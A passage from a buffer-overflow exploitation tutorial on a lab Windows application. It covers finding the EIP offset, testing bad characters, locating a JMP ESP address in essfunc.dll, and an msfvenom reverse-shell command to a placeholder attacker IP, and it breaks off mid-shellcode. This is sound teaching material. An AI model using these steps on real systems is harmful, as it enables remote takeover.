    &lt;span class="nb"&gt;print&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;Could not connect to &amp;quot;&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="n"&gt;ip&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;:&amp;quot;&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="nb"&gt;str&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;port&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;
    &lt;span class="n"&gt;sys&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;exit&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;We execute this and we see that the application crashes. Because we know that when the function returns it writes the return address to EIP we will look at the value of EIP when it crashes. In Immunity Debugger we see:&lt;/p&gt;
&lt;p&gt;&lt;img alt="The value of EIP after the cyclic pattern is used in the overflow" src="/images/binexp-corner-1/bof3.png"&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;70433570&lt;/code&gt; - is the value of the EIP when we fed it the cyclic payload. We have two options of using this to get the value of the offset.&lt;/p&gt;
&lt;p&gt;The first is to use the metasploit pattern_offset.rb tool to do this:&lt;/p&gt;
&lt;p&gt;&lt;code&gt;/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l &amp;lt;length&amp;gt; -q &amp;lt;EIP value&amp;gt;&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;The second is to use the immunity plugin, mona:&lt;/p&gt;
&lt;p&gt;&lt;code&gt;!mona findmsp -distance &amp;lt;length&amp;gt;&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;(findmsp - read find metasploit pattern)&lt;/p&gt;
&lt;p&gt;We get an offset of 2026 bytes.&lt;/p&gt;
&lt;p&gt;If all went well we should be able to overwrite our EIP with "BBBB" if we feed it a string:&lt;/p&gt;
&lt;p&gt;&lt;code&gt;payload = 'A' * 2026 + 'BBBB'&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;img alt="EIP Overwritten" src="/images/binexp-corner-1/bof4.png"&gt;&lt;/p&gt;
&lt;p&gt;Success. The hex representation of BBBB is 4242424242. We control the the EIP.&lt;/p&gt;
&lt;h3&gt;Finding Bad Characters&lt;/h3&gt;
&lt;p&gt;Now, there's a thing we need to account for which is bad characters. These are characters that get modified by the program when loading things into the buffer. &lt;/p&gt;
&lt;p&gt;This is important because if we use these in either the EIP or the shellcode it will break our exploit. Character &lt;code&gt;'\x00'&lt;/code&gt; is always a bad characters so we don't need to look for that one.&lt;/p&gt;
&lt;p&gt;What we do to identify this is to send a string with all the individual distinct hex codes to the application (after the EIP) and then comparing it to what actually gets stored in memory.&lt;/p&gt;
&lt;p&gt;So we need a bytearray with all the possible combinations. We can grab this from google:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="n"&gt;badChars&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;
&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="se"&gt;\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;
&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="se"&gt;\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;
&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="se"&gt;\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;
&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="se"&gt;\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;
&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="se"&gt;\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;
&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="se"&gt;\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;
&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="se"&gt;\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;
&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="se"&gt;\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;
&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="se"&gt;\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;
&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="se"&gt;\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;
&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="se"&gt;\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;
&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="se"&gt;\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;
&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="se"&gt;\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;
&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="se"&gt;\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;
&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="se"&gt;\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;
&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="se"&gt;\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;
&lt;span class="p"&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;Or we can just use &lt;code&gt;mona&lt;/code&gt; again.&lt;/p&gt;
&lt;p&gt;&lt;code&gt;!mona bytearray -b "\x00"&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;The result gets stored in our working folder.&lt;/p&gt;
&lt;p&gt;Then we feed this to the application (after overwritting EIP).&lt;/p&gt;
&lt;p&gt;We can see in immunity debugger already that ESP is pointing at the remainder our payload. And we can either compare what's in memory via a script of our making, or look at which bytes are out of sequence.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="mi"&gt;01&lt;/span&gt; &lt;span class="mi"&gt;02&lt;/span&gt; &lt;span class="mi"&gt;03&lt;/span&gt; &lt;span class="mi"&gt;04&lt;/span&gt; &lt;span class="mi"&gt;05&lt;/span&gt; &lt;span class="mi"&gt;06&lt;/span&gt; &lt;span class="mi"&gt;07&lt;/span&gt; &lt;span class="mi"&gt;08&lt;/span&gt; &lt;span class="mi"&gt;09&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="n"&gt;A&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="n"&gt;B&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="n"&gt;C&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="n"&gt;D&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="n"&gt;E&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="n"&gt;F&lt;/span&gt; &lt;span class="mi"&gt;10&lt;/span&gt; &lt;span class="mi"&gt;11&lt;/span&gt; &lt;span class="mi"&gt;12&lt;/span&gt; &lt;span class="mi"&gt;13&lt;/span&gt; &lt;span class="mi"&gt;14&lt;/span&gt; &lt;span class="mi"&gt;15&lt;/span&gt; &lt;span class="mi"&gt;16&lt;/span&gt; &lt;span class="mi"&gt;17&lt;/span&gt; &lt;span class="mi"&gt;18&lt;/span&gt; &lt;span class="mi"&gt;19&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="n"&gt;A&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="n"&gt;B&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="n"&gt;C&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="n"&gt;D&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="n"&gt;E&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="n"&gt;F&lt;/span&gt; &lt;span class="mi"&gt;20&lt;/span&gt;
&lt;span class="mi"&gt;21&lt;/span&gt; &lt;span class="mi"&gt;22&lt;/span&gt; &lt;span class="mi"&gt;23&lt;/span&gt; &lt;span class="mi"&gt;24&lt;/span&gt; &lt;span class="mi"&gt;25&lt;/span&gt; &lt;span class="mi"&gt;26&lt;/span&gt; &lt;span class="mi"&gt;27&lt;/span&gt; &lt;span class="mi"&gt;28&lt;/span&gt; &lt;span class="mi"&gt;29&lt;/span&gt; &lt;span class="mi"&gt;2&lt;/span&gt;&lt;span class="n"&gt;A&lt;/span&gt; &lt;span class="mi"&gt;2&lt;/span&gt;&lt;span class="n"&gt;B&lt;/span&gt; &lt;span class="mi"&gt;2&lt;/span&gt;&lt;span class="n"&gt;C&lt;/span&gt; &lt;span class="mi"&gt;2&lt;/span&gt;&lt;span class="n"&gt;D&lt;/span&gt; &lt;span class="mi"&gt;2&lt;/span&gt;&lt;span class="n"&gt;E&lt;/span&gt; &lt;span class="mi"&gt;2&lt;/span&gt;&lt;span class="n"&gt;F&lt;/span&gt; &lt;span class="mi"&gt;30&lt;/span&gt; &lt;span class="mi"&gt;31&lt;/span&gt; &lt;span class="mi"&gt;32&lt;/span&gt; &lt;span class="mi"&gt;33&lt;/span&gt; &lt;span class="mi"&gt;34&lt;/span&gt; &lt;span class="mi"&gt;35&lt;/span&gt; &lt;span class="mi"&gt;36&lt;/span&gt; &lt;span class="mi"&gt;37&lt;/span&gt; &lt;span class="mi"&gt;38&lt;/span&gt; &lt;span class="mi"&gt;39&lt;/span&gt; &lt;span class="mi"&gt;3&lt;/span&gt;&lt;span class="n"&gt;A&lt;/span&gt; &lt;span class="mi"&gt;3&lt;/span&gt;&lt;span class="n"&gt;B&lt;/span&gt; &lt;span class="mi"&gt;3&lt;/span&gt;&lt;span class="n"&gt;C&lt;/span&gt; &lt;span class="mi"&gt;3&lt;/span&gt;&lt;span class="n"&gt;D&lt;/span&gt; &lt;span class="mi"&gt;3&lt;/span&gt;&lt;span class="n"&gt;E&lt;/span&gt; &lt;span class="mi"&gt;3&lt;/span&gt;&lt;span class="n"&gt;F&lt;/span&gt; &lt;span class="mi"&gt;40&lt;/span&gt;
&lt;span class="mi"&gt;41&lt;/span&gt; &lt;span class="mi"&gt;42&lt;/span&gt; &lt;span class="mi"&gt;43&lt;/span&gt; &lt;span class="mi"&gt;44&lt;/span&gt; &lt;span class="mi"&gt;45&lt;/span&gt; &lt;span class="mi"&gt;46&lt;/span&gt; &lt;span class="mi"&gt;47&lt;/span&gt; &lt;span class="mi"&gt;48&lt;/span&gt; &lt;span class="mi"&gt;49&lt;/span&gt; &lt;span class="mi"&gt;4&lt;/span&gt;&lt;span class="n"&gt;A&lt;/span&gt; &lt;span class="mi"&gt;4&lt;/span&gt;&lt;span class="n"&gt;B&lt;/span&gt; &lt;span class="mi"&gt;4&lt;/span&gt;&lt;span class="n"&gt;C&lt;/span&gt; &lt;span class="mi"&gt;4&lt;/span&gt;&lt;span class="n"&gt;D&lt;/span&gt; &lt;span class="mi"&gt;4&lt;/span&gt;&lt;span class="n"&gt;E&lt;/span&gt; &lt;span class="mi"&gt;4&lt;/span&gt;&lt;span class="n"&gt;F&lt;/span&gt; &lt;span class="mi"&gt;50&lt;/span&gt; &lt;span class="mi"&gt;51&lt;/span&gt; &lt;span class="mi"&gt;52&lt;/span&gt; &lt;span class="mi"&gt;53&lt;/span&gt; &lt;span class="mi"&gt;54&lt;/span&gt; &lt;span class="mi"&gt;55&lt;/span&gt; &lt;span class="mi"&gt;56&lt;/span&gt; &lt;span class="mi"&gt;57&lt;/span&gt; &lt;span class="mi"&gt;58&lt;/span&gt; &lt;span class="mi"&gt;59&lt;/span&gt; &lt;span class="mi"&gt;5&lt;/span&gt;&lt;span class="n"&gt;A&lt;/span&gt; &lt;span class="mi"&gt;5&lt;/span&gt;&lt;span class="n"&gt;B&lt;/span&gt; &lt;span class="mi"&gt;5&lt;/span&gt;&lt;span class="n"&gt;C&lt;/span&gt; &lt;span class="mi"&gt;5&lt;/span&gt;&lt;span class="n"&gt;D&lt;/span&gt; &lt;span class="mi"&gt;5&lt;/span&gt;&lt;span class="n"&gt;E&lt;/span&gt; &lt;span class="mi"&gt;5&lt;/span&gt;&lt;span class="n"&gt;F&lt;/span&gt; &lt;span class="mi"&gt;60&lt;/span&gt;
&lt;span class="mi"&gt;61&lt;/span&gt; &lt;span class="mi"&gt;62&lt;/span&gt; &lt;span class="mi"&gt;63&lt;/span&gt; &lt;span class="mi"&gt;64&lt;/span&gt; &lt;span class="mi"&gt;65&lt;/span&gt; &lt;span class="mi"&gt;66&lt;/span&gt; &lt;span class="mi"&gt;67&lt;/span&gt; &lt;span class="mi"&gt;68&lt;/span&gt; &lt;span class="mi"&gt;69&lt;/span&gt; &lt;span class="mi"&gt;6&lt;/span&gt;&lt;span class="n"&gt;A&lt;/span&gt; &lt;span class="mi"&gt;6&lt;/span&gt;&lt;span class="n"&gt;B&lt;/span&gt; &lt;span class="mi"&gt;6&lt;/span&gt;&lt;span class="n"&gt;C&lt;/span&gt; &lt;span class="mi"&gt;6&lt;/span&gt;&lt;span class="n"&gt;D&lt;/span&gt; &lt;span class="mi"&gt;6&lt;/span&gt;&lt;span class="n"&gt;E&lt;/span&gt; &lt;span class="mi"&gt;6&lt;/span&gt;&lt;span class="n"&gt;F&lt;/span&gt; &lt;span class="mi"&gt;70&lt;/span&gt; &lt;span class="mi"&gt;71&lt;/span&gt; &lt;span class="mi"&gt;72&lt;/span&gt; &lt;span class="mi"&gt;73&lt;/span&gt; &lt;span class="mi"&gt;74&lt;/span&gt; &lt;span class="mi"&gt;75&lt;/span&gt; &lt;span class="mi"&gt;76&lt;/span&gt; &lt;span class="mi"&gt;77&lt;/span&gt; &lt;span class="mi"&gt;78&lt;/span&gt; &lt;span class="mi"&gt;79&lt;/span&gt; &lt;span class="mi"&gt;7&lt;/span&gt;&lt;span class="n"&gt;A&lt;/span&gt; &lt;span class="mi"&gt;7&lt;/span&gt;&lt;span class="n"&gt;B&lt;/span&gt; &lt;span class="mi"&gt;7&lt;/span&gt;&lt;span class="n"&gt;C&lt;/span&gt; &lt;span class="mi"&gt;7&lt;/span&gt;&lt;span class="n"&gt;D&lt;/span&gt; &lt;span class="mi"&gt;7&lt;/span&gt;&lt;span class="n"&gt;E&lt;/span&gt; &lt;span class="mi"&gt;7&lt;/span&gt;&lt;span class="n"&gt;F&lt;/span&gt; &lt;span class="mi"&gt;80&lt;/span&gt;
&lt;span class="mi"&gt;81&lt;/span&gt; &lt;span class="mi"&gt;82&lt;/span&gt; &lt;span class="mi"&gt;83&lt;/span&gt; &lt;span class="mi"&gt;84&lt;/span&gt; &lt;span class="mi"&gt;85&lt;/span&gt; &lt;span class="mi"&gt;86&lt;/span&gt; &lt;span class="mi"&gt;87&lt;/span&gt; &lt;span class="mi"&gt;88&lt;/span&gt; &lt;span class="mi"&gt;89&lt;/span&gt; &lt;span class="mi"&gt;8&lt;/span&gt;&lt;span class="n"&gt;A&lt;/span&gt; &lt;span class="mi"&gt;8&lt;/span&gt;&lt;span class="n"&gt;B&lt;/span&gt; &lt;span class="mi"&gt;8&lt;/span&gt;&lt;span class="n"&gt;C&lt;/span&gt; &lt;span class="mi"&gt;8&lt;/span&gt;&lt;span class="n"&gt;D&lt;/span&gt; &lt;span class="mi"&gt;8&lt;/span&gt;&lt;span class="n"&gt;E&lt;/span&gt; &lt;span class="mi"&gt;8&lt;/span&gt;&lt;span class="n"&gt;F&lt;/span&gt; &lt;span class="mi"&gt;90&lt;/span&gt; &lt;span class="mi"&gt;91&lt;/span&gt; &lt;span class="mi"&gt;92&lt;/span&gt; &lt;span class="mi"&gt;93&lt;/span&gt; &lt;span class="mi"&gt;94&lt;/span&gt; &lt;span class="mi"&gt;95&lt;/span&gt; &lt;span class="mi"&gt;96&lt;/span&gt; &lt;span class="mi"&gt;97&lt;/span&gt; &lt;span class="mi"&gt;98&lt;/span&gt; &lt;span class="mi"&gt;99&lt;/span&gt; &lt;span class="mi"&gt;9&lt;/span&gt;&lt;span class="n"&gt;A&lt;/span&gt; &lt;span class="mi"&gt;9&lt;/span&gt;&lt;span class="n"&gt;B&lt;/span&gt; &lt;span class="mi"&gt;9&lt;/span&gt;&lt;span class="n"&gt;C&lt;/span&gt; &lt;span class="mi"&gt;9&lt;/span&gt;&lt;span class="n"&gt;D&lt;/span&gt; &lt;span class="mi"&gt;9&lt;/span&gt;&lt;span class="n"&gt;E&lt;/span&gt; &lt;span class="mi"&gt;9&lt;/span&gt;&lt;span class="n"&gt;F&lt;/span&gt; &lt;span class="n"&gt;A0&lt;/span&gt;
&lt;span class="n"&gt;A1&lt;/span&gt; &lt;span class="n"&gt;A2&lt;/span&gt; &lt;span class="n"&gt;A3&lt;/span&gt; &lt;span class="n"&gt;A4&lt;/span&gt; &lt;span class="n"&gt;A5&lt;/span&gt; &lt;span class="n"&gt;A6&lt;/span&gt; &lt;span class="n"&gt;A7&lt;/span&gt; &lt;span class="n"&gt;A8&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="n"&gt;A&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="n"&gt;D&lt;/span&gt; &lt;span class="n"&gt;AB&lt;/span&gt; &lt;span class="n"&gt;AC&lt;/span&gt; &lt;span class="n"&gt;AD&lt;/span&gt; &lt;span class="n"&gt;AE&lt;/span&gt; &lt;span class="n"&gt;AF&lt;/span&gt; &lt;span class="n"&gt;B0&lt;/span&gt; &lt;span class="n"&gt;B1&lt;/span&gt; &lt;span class="n"&gt;B2&lt;/span&gt; &lt;span class="n"&gt;B3&lt;/span&gt; &lt;span class="n"&gt;B4&lt;/span&gt; &lt;span class="n"&gt;B5&lt;/span&gt; &lt;span class="n"&gt;B6&lt;/span&gt; &lt;span class="n"&gt;B7&lt;/span&gt; &lt;span class="n"&gt;B8&lt;/span&gt; &lt;span class="n"&gt;B9&lt;/span&gt; &lt;span class="n"&gt;BA&lt;/span&gt; &lt;span class="n"&gt;BB&lt;/span&gt; &lt;span class="n"&gt;BC&lt;/span&gt; &lt;span class="n"&gt;BD&lt;/span&gt; &lt;span class="n"&gt;BE&lt;/span&gt; &lt;span class="n"&gt;BF&lt;/span&gt; &lt;span class="n"&gt;C0&lt;/span&gt;
&lt;span class="n"&gt;C1&lt;/span&gt; &lt;span class="n"&gt;C2&lt;/span&gt; &lt;span class="n"&gt;C3&lt;/span&gt; &lt;span class="n"&gt;C4&lt;/span&gt; &lt;span class="n"&gt;C5&lt;/span&gt; &lt;span class="n"&gt;C6&lt;/span&gt; &lt;span class="n"&gt;C7&lt;/span&gt; &lt;span class="n"&gt;C8&lt;/span&gt; &lt;span class="n"&gt;C9&lt;/span&gt; &lt;span class="n"&gt;CA&lt;/span&gt; &lt;span class="n"&gt;CB&lt;/span&gt; &lt;span class="n"&gt;CC&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="n"&gt;A&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="n"&gt;D&lt;/span&gt; &lt;span class="n"&gt;CF&lt;/span&gt; &lt;span class="n"&gt;D0&lt;/span&gt; &lt;span class="n"&gt;D1&lt;/span&gt; &lt;span class="n"&gt;D2&lt;/span&gt; &lt;span class="n"&gt;D3&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="n"&gt;A&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="n"&gt;D&lt;/span&gt; &lt;span class="n"&gt;D6&lt;/span&gt; &lt;span class="n"&gt;D7&lt;/span&gt; &lt;span class="n"&gt;D8&lt;/span&gt; &lt;span class="n"&gt;D9&lt;/span&gt; &lt;span class="n"&gt;DA&lt;/span&gt; &lt;span class="n"&gt;DB&lt;/span&gt; &lt;span class="n"&gt;DC&lt;/span&gt; &lt;span class="n"&gt;DD&lt;/span&gt; &lt;span class="n"&gt;DE&lt;/span&gt; &lt;span class="n"&gt;DF&lt;/span&gt; &lt;span class="n"&gt;E0&lt;/span&gt;
&lt;span class="n"&gt;E1&lt;/span&gt; &lt;span class="n"&gt;E2&lt;/span&gt; &lt;span class="n"&gt;E3&lt;/span&gt; &lt;span class="n"&gt;E4&lt;/span&gt; &lt;span class="n"&gt;E5&lt;/span&gt; &lt;span class="n"&gt;E6&lt;/span&gt; &lt;span class="n"&gt;E7&lt;/span&gt; &lt;span class="n"&gt;E8&lt;/span&gt; &lt;span class="n"&gt;E9&lt;/span&gt; &lt;span class="n"&gt;EA&lt;/span&gt; &lt;span class="n"&gt;EB&lt;/span&gt; &lt;span class="n"&gt;EC&lt;/span&gt; &lt;span class="n"&gt;ED&lt;/span&gt; &lt;span class="n"&gt;EE&lt;/span&gt; &lt;span class="n"&gt;EF&lt;/span&gt; &lt;span class="n"&gt;F0&lt;/span&gt; &lt;span class="n"&gt;F1&lt;/span&gt; &lt;span class="n"&gt;F2&lt;/span&gt; &lt;span class="n"&gt;F3&lt;/span&gt; &lt;span class="n"&gt;F4&lt;/span&gt; &lt;span class="n"&gt;F5&lt;/span&gt; &lt;span class="n"&gt;F6&lt;/span&gt; &lt;span class="n"&gt;F7&lt;/span&gt; &lt;span class="n"&gt;F8&lt;/span&gt; &lt;span class="n"&gt;F9&lt;/span&gt; &lt;span class="n"&gt;FA&lt;/span&gt; &lt;span class="n"&gt;FB&lt;/span&gt; &lt;span class="n"&gt;FC&lt;/span&gt; &lt;span class="n"&gt;FD&lt;/span&gt; &lt;span class="n"&gt;FE&lt;/span&gt; &lt;span class="n"&gt;FF&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;Or, luckily we can have mona take care of this problem for us.&lt;/p&gt;
&lt;p&gt;&lt;code&gt;!mona compare -f C:\mona\oscp\bytearray.bin -a &amp;lt;address&amp;gt;&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;No matter how we do that we get &lt;code&gt;a9 aa cd ce d4 d5&lt;/code&gt;. One thing that can happen here, is that often when a character is changed, the character next to it gets changed to the wrong value too. But sometimes that second value isn't an actual bad char. To verify this we can remove A9, CD and D4 from our byte array and test again.&lt;/p&gt;
&lt;p&gt;Of course for this we'll have to generate a byte array without those.&lt;/p&gt;
&lt;p&gt;&lt;code&gt;!mona bytearray -b "\x00\xa9\xCD\xD4"&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;And then we compare again. If there are no more bad characters we can confirm that we have all the values we need to avoid.&lt;/p&gt;
&lt;h3&gt;Finding the Right Module&lt;/h3&gt;
&lt;p&gt;Alright, so we want to find what libraries are loaded by the application. And then find a JMP ESP instruction in those. So that we can tell the program what to execute our payload next.&lt;/p&gt;
&lt;p&gt;One way we could do this is via Immunity Debugger's → View → Executable Modules and then view memory in each loaded module and search for an &lt;code&gt;FF E4&lt;/code&gt; instruction in it. &lt;code&gt;FF E4&lt;/code&gt; is the Hex for a JMP ESP instruction, we can check via nasm_shell.rb in the metasploit framework tools.&lt;/p&gt;
&lt;p&gt;Now one thing this method is missing is what protections are active in the library. So i don't recommend it. I do recommend that you use &lt;code&gt;mona&lt;/code&gt; this time.&lt;/p&gt;
&lt;p&gt;&lt;code&gt;!mona modules&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;This will tell us what executable modules are loaded by our binary and it will also tell us which protections are in place for each. We can see that &lt;code&gt;essfunc.dll&lt;/code&gt; has no protections active. Great we can exploit that. Then we can either follow the above procedure or we can just use this command to do the same thing:&lt;/p&gt;
&lt;p&gt;&lt;code&gt;!mona find -s "\xff\xe4" -m essfunc.dll&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;We'd then choose an address that does not have any bad characters in it.&lt;/p&gt;
&lt;p&gt;Or, rather, my favourite, we can do all of this at once:&lt;/p&gt;
&lt;p&gt;&lt;code&gt;!mona jmp -r esp -cpb "\x00\xa0\xcd\xd4"&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;Sorry I left that one for last, but now you know why we're using it. What it does is search for search for &lt;code&gt;jmp&lt;/code&gt; instructions to the register specified by &lt;code&gt;-r&lt;/code&gt; and avoiding the bad characters in &lt;code&gt;-cpb&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;This gives us address: &lt;code&gt;625011AF&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;Now we know the machine is x86 architecture which is little-endian (this is out of scope for this talk), but it means that we need to reverse the byte order to get the actual address in memory which becomes &lt;code&gt;AF115062&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;Or for the purposes of overwriting the return address (and therefore the EIP): &lt;code&gt;\xaf\x11\x50\x62&lt;/code&gt;.&lt;/p&gt;
&lt;h3&gt;Generating Shellcode and the NOP sled&lt;/h3&gt;
&lt;p&gt;All we need now is actually something to execute. Let's get a reverse shell.&lt;/p&gt;
&lt;p&gt;We'll use &lt;code&gt;msfvenom&lt;/code&gt; to generate our shell code. You should already be familiar with this tool, if you aren't take a look at the What the Shell room on TryHackMe (&lt;a href="https://tryhackme.com/room/introtoshells"&gt;https://tryhackme.com/room/introtoshell&lt;/a&gt;).&lt;/p&gt;
&lt;p&gt;&lt;code&gt;msfvenom -p windows/shell_reverse_tcp LHOST=&amp;lt;Attacker-IP-ADDRESS&amp;gt; LPORT=4444 EXITFUNC=thread -b "\x00\xa0\xcd\xd4" -a x86 -f c&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;This generates code for a windows reverse shell, pointed at our attack machine, on port 4444, for x86 architecture and we ask for it in c because it gives us something that'll be really easy to convert to our python exploit.&lt;/p&gt;
&lt;p&gt;We copy this part to our exploit:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="s"&gt;&amp;quot;&lt;/span&gt;&lt;span class="se"&gt;\xb8\xbd\xf9\x81\x1a\xdb\xd9\xd9\x74\x24\xf4\x5e\x29\xc9\xb1&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;
&lt;span class="s"&gt;&amp;quot;&lt;/span&gt;&lt;span class="se"&gt;\x52\x83\xee\xfc\x31\x46\x0e\x03\xfb\xf7\x63\xef\xff\xe0\xe6&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;
&lt;span class="s"&gt;&amp;quot;&lt;/span&gt;&lt;span class="se"&gt;\x10\xff\xf0\x86\x99\x1a\xc1\x86\xf1\x6f\x72\x37\x74\x3d\x7f&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;
